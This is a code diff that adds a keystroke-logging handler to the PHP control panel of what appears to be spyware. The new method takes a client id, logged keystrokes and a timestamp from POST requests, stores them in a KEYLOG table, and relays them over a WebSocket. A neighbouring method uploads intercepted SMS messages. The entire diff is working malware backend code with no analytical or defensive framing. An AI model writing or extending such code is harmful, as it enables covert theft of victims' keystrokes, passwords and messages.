@@ -571,6 +571,34 @@ class ControlPanel extends Base
     }
 
     /**
+     * Handle keylogging
+     */
+    public function keylog()
+    {
+        if (!isset($_POST['id']))
+            return;
+
+        if (!isset($_POST['logs']))
+            return;
+        
+        if (!isset($_POST['timestamp']))
+            return;
+
+        $query = "INSERT INTO KEYLOG(client_id, text, timestamp) VALUES(?, ?, ?)";
+        $this->database->insert($query, [$_POST['id'], $_POST['logs'], $_POST['timestamp']]);
+
+         $client = new TextTalkWebSocket($this->webSocketURI);
+
+        try {
+            // Send a message
+            $client->send(json_encode($_POST));
+        
+            // Close the WebSocket connection
+            $client->close();
+        } catch (\Exception $e) {}
+    }
+
+    /**
      * Upload sms gotten from sms broadcast receiver
      */
     public function uploadMessage(): void
